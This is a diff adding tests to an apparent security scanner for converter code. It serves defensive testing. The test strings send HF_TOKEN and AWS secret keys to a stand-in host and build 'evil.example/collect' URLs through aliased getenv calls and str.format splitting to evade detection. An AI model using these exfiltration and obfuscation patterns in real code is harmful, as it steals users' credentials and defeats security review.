@@ -3432,6 +3432,13 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         'import os\nimport requests\nfrom os import environ as e\n' + hub
         + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
         + ' "b": e["AWS_SECRET_ACCESS_KEY"]})\n',
+        # An alias keeps no reserved spelling, so the name it lands under says
+        # nothing. An os.getenv that is not called right here is one going
+        # somewhere this does not follow.
+        'import os\nimport requests\n' + hub
+        + 'read_secret = os.getenv\n'
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": read_secret("AWS_SECRET_ACCESS_KEY")})\n',
     ):
         assert any(
             "Harvests environment variables" in f.check
@@ -3439,13 +3446,19 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         ), body
 
     # os.environ and os.getenv are attributes, not bare names, and upstream's
-    # own shape reads both. It must still pass.
+    # own shape reads both. It must still pass, and os.getenv CALLED here is
+    # not an alias of anything.
     assert scan_converter_source(
         'import os\nimport requests\n' + hub
         + 'headers = {}\n'
         + 'if os.environ.get("HF_TOKEN"):\n'
         + '    headers["Authorization"] = f"Bearer {os.environ[\'HF_TOKEN\']}"\n'
         + 'requests.get(HUB, headers = headers)\n'
+    ) == []
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'if os.getenv("HF_TOKEN"):\n'
+        + '    requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
     ) == []
 
 
@@ -3792,6 +3805,16 @@ def test_the_hub_allowance_reads_the_real_hostname():
     # piece that cannot be read is a hole, as in an f-string, so a join is never
     # read as the pieces around the part this could not see.
     assert _beside_the_hub('"".join(("htt", "ps://ev", "il.exa", "mple/collect"))')
+    # str.format splits a scheme the same way, and upstream spells plenty of
+    # strings with it, 15 literal receivers across the real modules, so this one
+    # is FOLDED rather than refused. A field carrying a conversion or a format
+    # spec is left alone: "{:>1000000000}".format("x") is a gigabyte.
+    assert _beside_the_hub('"{}://{}".format("https", "evil.example/collect")')
+    assert _beside_the_hub('"{s}://{h}/c".format(s = "https", h = "evil.example")')
+    assert _beside_the_hub(
+        '"{a}://{b}".format_map({"a": "https", "b": "evil.example"})'
+    )
+    assert _beside_the_hub('"{}://{}".format("https", "huggingface.co")') == []
     assert _beside_the_hub('"".join([x, "htt", "ps://evil.example/collect"])')
     # The hole has to stay in the text. Dropping it leaves "https://huggingface.co",
     # which is the hub, while at runtime SUFFIX = "@evil.example/collect" makes the
